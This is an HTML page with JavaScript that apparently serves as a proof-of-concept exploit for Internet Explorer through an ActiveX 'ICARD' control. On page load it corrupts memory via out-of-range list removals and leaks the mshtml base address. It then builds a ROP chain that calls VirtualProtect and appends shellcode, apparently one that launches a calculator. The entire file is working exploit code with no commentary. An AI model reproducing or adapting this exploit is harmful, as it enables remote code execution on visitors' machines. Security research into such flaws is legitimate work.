<html>
    <body>
        <object classid='clsid:19916E01-B44E-4E31-94A4-4696DF46157B' id='ICARD'></object>
        <script>

            function sleep(d){
                for(var t = Date.now();Date.now() - t <= d;);
            }
 
            function create_object(i){   
                var obj = document.createElement("object");   
                obj.classid = 'clsid:19916E01-B44E-4E31-94A4-4696DF46157B';   
                obj.id = 'I'+i;
                document.body.appendChild(obj); 
                return  document['I'+i].RequiredClaims; 
            }

            function add_item(obj_icard, str, size){
                for(var i = 0; i < size; i++)
                    obj_icard.add(str+i);
            }

            function remove_item(obj_icard, size){
                for(var i = 0; i < size; i++)
                     obj_icard.remove(0);
            }

            function getFiller(n) {
                 return new Array(n+1).join("a");
            }

            function getDwordStr(val) {
                return String.fromCharCode(val % 0x10000, val / 0x10000);
            }


    function onLoad(){
           //alert("mshtml");

            CollectGarbage();
            rc_obj0 = create_object(0);
            rc_obj1 = create_object(1);
            rc_obj2 = create_object(2);
          
            rc_obj3 = create_object(3);
            rc_obj4 = create_object(4);
            rc_obj5 = create_object(5);

            add_item(rc_obj0,"A",20);
            add_item(rc_obj1,"B",20);
            add_item(rc_obj2,"C",20);

            //alert("create document");
            var mysvg = document.getElementById("svg_my");  
            var filter = document.createElementNS("http://www.w3.org/2000/svg","filter");
            mysvg.appendChild(filter);

            //alert("add_item");
            add_item(rc_obj3,"D",20);
            add_item(rc_obj4,"E",20);
            add_item(rc_obj5,"F",20);
			
            //alert("end_add,start remove");
            remove_item(rc_obj0,20);
            remove_item(rc_obj1,20);
            remove_item(rc_obj5,20);

            rc_obj5.remove(0);

            rc_obj5.remove(-88);
            //alert(11);
            rc_obj5.remove(-88);
            
            for(var i=0; i< 20;i++)
                rc_obj5.remove(-110);

            var function_addr = rc_obj2.item(0).charCodeAt(1)*65536+rc_obj2.item(0).charCodeAt(0);  
            //alert('0x'+(function_addr-0x006478dd).toString(16)); 

            var mshtml_addr = function_addr-0x006478dd;
            //alert(mshtml_addr.toString(16));

            //alert("ROP");
            remove_item(rc_obj3,20);

            vtguard = mshtml_addr + 0x00749c41;
            
            var payload = "";

            payload += getDwordStr(mshtml_addr+0x00348dea); //add esp,1c # retn 

            for(var i = 0; i < 7; ++i)
                payload += getDwordStr(0x0c0c0c0c);

            payload += getDwordStr(mshtml_addr+0x00348dea); //add esp,1c # retn 

            for(var i = 0; i < 7; ++i)
                payload += getDwordStr(0x0c0c0c0c);

            payload += getDwordStr(mshtml_addr+0x00348dea); //add esp,1c # retn 
            payload += getDwordStr(0x0c0c0c0c);
            payload += getDwordStr(vtguard);
            // 17
            for(var i = 0; i < 5; ++i)
                payload += getDwordStr(0x0c0c0c0c);

            payload += getDwordStr(mshtml_addr+0x00348dea); //add esp,1c # retn 

            for(var i = 0; i < 7; ++i)
                payload += getDwordStr(0x0c0c0c0c);

            payload += getDwordStr(mshtml_addr+0x00348dea); //add esp,1c # retn 

            for(var i = 0; i < 3; ++i)
                payload += getDwordStr(0x0c0c0c0c);

            payload += getDwordStr(mshtml_addr+0x00028cc4); //xchg eax,esp#retn

            //52
            for(var i = 0; i < 3; ++i)
                payload += getDwordStr(0x0c0c0c0c);

            //virtualprotect ROP START
           
            payload += getDwordStr(mshtml_addr+0x00050251);  //POP EBP # RETN 
            payload += getDwordStr(mshtml_addr+0x00050251);  //skip 4 bytes 
            payload += getDwordStr(mshtml_addr+0x00050564);  //POP EBX # RETN
            payload += getDwordStr(0x77777979);              //0x77777979-> ebx
            payload += getDwordStr(mshtml_addr+0x0009508b);  //POP EAX # RETN
            payload += getDwordStr(0x88888888);              //0x88888888-> eax
            payload += getDwordStr(mshtml_addr+0x006aaf77);  //add ebx,eax #retn
            payload += getDwordStr(mshtml_addr+0x0009508b);  //POP EAX # RETN
            payload += getDwordStr(0xFFFFFFC0);  //EAX
            payload += getDwordStr(mshtml_addr+0x0020fa4d);  //neg eax#retn
            payload += getDwordStr(mshtml_addr+0x0040b131);  //mov edx,eax #retn
            payload += getDwordStr(mshtml_addr+0x00015798);  //POP ECX # RETN
            payload += getDwordStr(mshtml_addr+0x00edb001);              // &Writable location
            payload += getDwordStr(mshtml_addr+0x00081aa8);  //POP EDI # RETN
            payload += getDwordStr(mshtml_addr+0x00081aa9);  //RETN 
            payload += getDwordStr(mshtml_addr+0x00001430);  //POP ESI # RETN
            payload += getDwordStr(mshtml_addr+0x0006c1df);  //JMP [EAX]
            payload += getDwordStr(mshtml_addr+0x0009508b);  //POP EAX # RETN
            payload += getDwordStr(mshtml_addr+0x00ed5434);  //ptr to &VirtualProtect() 
            payload += getDwordStr(mshtml_addr+0x00095486);  //PUSHAD # RETN 
            payload += getDwordStr(mshtml_addr+0x00130fdb);  //ptr to 'jmp esp'

            payload += getDwordStr(0x90909090);  //nop # jmp 120

            for(var i = 0; i < 26; ++i)
                payload += getDwordStr(0x90909090);

            payload += getDwordStr(0x909006eb);  //jmp 06

            payload += getDwordStr(mshtml_addr+0x00883196);  // call  dword ptr [eax+90h]

            //shellcode
            payload += getDwordStr(0xf63154eb);
            payload += getDwordStr(0x30768b64);
            payload += getDwordStr(0x8b0c768b);
            payload += getDwordStr(0x6e8b1c76);
            payload += getDwordStr(0x8b368b08);
            payload += getDwordStr(0x5c8b3c5d);
            payload += getDwordStr(0xdb85781d);
            payload += getDwordStr(0xeb01f074);
            payload += getDwordStr(0x67184b8b);
            payload += getDwordStr(0x7b8be8e3);
            payload += getDwordStr(0x8bef0120);
            payload += getDwordStr(0x01fc8f7c);
            payload += getDwordStr(0x99c031ef);
            payload += getDwordStr(0xcac11702);
            payload += getDwordStr(0xf875ae04);
            payload += getDwordStr(0x0424543b);
            payload += getDwordStr(0xca75e4e0);
            payload += getDwordStr(0x0124538b);
            payload += getDwordStr(0x14b70fea);
            payload += getDwordStr(0x1c7b8b4a);
            payload += getDwordStr(0x2c03ef01);
            payload += getDwordStr(0xe768c397);
            payload += getDwordStr(0xe869ccc4);
            payload += getDwordStr(0xffffffa2);
            payload += getDwordStr(0x61636850);
            payload += getDwordStr(0xd48b636c);
            payload += getDwordStr(0xff525040);
            payload += getDwordStr(0xa67768d5);
            payload += getDwordStr(0x8be82a60);
            payload += getDwordStr(0x50ffffff);
            payload += getDwordStr(0x9090d5ff);

            add_item(rc_obj3, payload ,20);
            rc_obj5.remove(-108);
            rc_obj5.remove(-108);   
            
            for(var i=0;i<20;i++)   
                rc_obj5.remove(-132);

            var table = document.createElement('table');
            filter.appendChild(table);
        }

        window.onload = onLoad;  
        </script>
        <svg id="svg_my" style="border:1px solid #000;width:200px;height:200px" version="1.1" xmlns="http://www.w3.org/2000/svg">  
          
        </svg>  
    </body>
</html>